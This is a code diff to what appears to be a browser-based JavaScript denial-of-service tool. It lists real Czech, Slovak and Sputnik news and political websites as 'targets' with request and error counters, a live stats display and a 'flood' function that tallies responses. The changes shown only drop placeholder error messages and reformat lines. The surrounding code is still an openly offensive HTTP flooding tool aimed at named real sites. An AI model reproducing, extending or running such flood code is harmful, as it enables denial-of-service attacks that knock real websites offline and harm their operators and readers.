@@ -114,49 +114,40 @@ var targets = {
     "https://cz.sputniknews.com/": {
         number_of_requests: 0,
         number_of_errored_responses: 0,
-        "error_message": "Failed to fetch"
     },
     "https://sputniknews.com/": {
         number_of_requests: 0,
         number_of_errored_responses: 0,
-        "error_message": "Failed to fetch"
     },
     "https://www.parlamentnilisty.cz/": {
         number_of_requests: 0,
         number_of_errored_responses: 0,
-        "error_message": "Failed to fetch"
     },
     "https://zemavek.sk/": {
         number_of_requests: 0,
         number_of_errored_responses: 0,
-        "error_message": "Failed to fetch"
     },
     "https://hlavnespravy.sk/": {
         number_of_requests: 0,
         number_of_errored_responses: 0,
-        "error_message": "Failed to fetch"
     },
     "https://www.rudyprapor.cz/": {
         number_of_requests: 0,
         number_of_errored_responses: 0,
-        "error_message": "Failed to fetch"
     },
     "https://aliancenarodnichsil.cz/": {
         number_of_requests: 0,
         number_of_errored_responses: 0,
-        "error_message": "Failed to fetch"
     },
     "http://otevrisvoumysl.cz/": {
         number_of_requests: 0,
         number_of_errored_responses: 0,
-        "error_message": "Failed to fetch"
     },
 };
 
 var statsEl = document.getElementById("stats");
 function printStats() {
-    statsEl.innerHTML =
-        "<pre>" + JSON.stringify(targets, null, 2) + "</pre>";
+    statsEl.innerHTML = "<pre>" + JSON.stringify(targets, null, 2) + "</pre>";
 }
 setInterval(printStats, 100);
 
@@ -196,8 +187,7 @@ async function flood(target) {
                 .then((response) => {
                     if (response && !response.ok) {
                         targets[target].number_of_errored_responses++;
-                        targets[target].error_message =
-                            response.statusText;
+                        targets[target].error_message = response.statusText;
                     }
                     targets[target].number_of_requests++;
                 })
